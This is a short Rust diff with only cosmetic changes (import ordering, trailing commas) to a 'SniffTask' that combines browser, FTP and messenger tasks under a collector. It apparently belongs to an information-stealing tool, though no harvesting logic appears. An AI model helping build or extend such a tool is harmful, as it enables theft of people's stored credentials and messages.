@@ -18,10 +18,10 @@ use browsers::BrowsersTask;
 use collector::Collector;
 use ftp::FtpTask;
 use messengers::MessengersTask;
-use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
+use tasks::{CompositeTask, Task, composite_task, impl_composite_task_runner};
 
 pub struct SniffTask<C: Collector> {
-    inner: CompositeTask<C>
+    inner: CompositeTask<C>,
 }
 
 impl<C: Collector + 'static> Default for SniffTask<C> {
@@ -36,7 +36,7 @@ impl<C: Collector + 'static> Default for SniffTask<C> {
                 FtpTask::default(),
                 MessengersTask::default(),
                 BrowsersTask::default(),
-            )
+            ),
         }
     }
 }
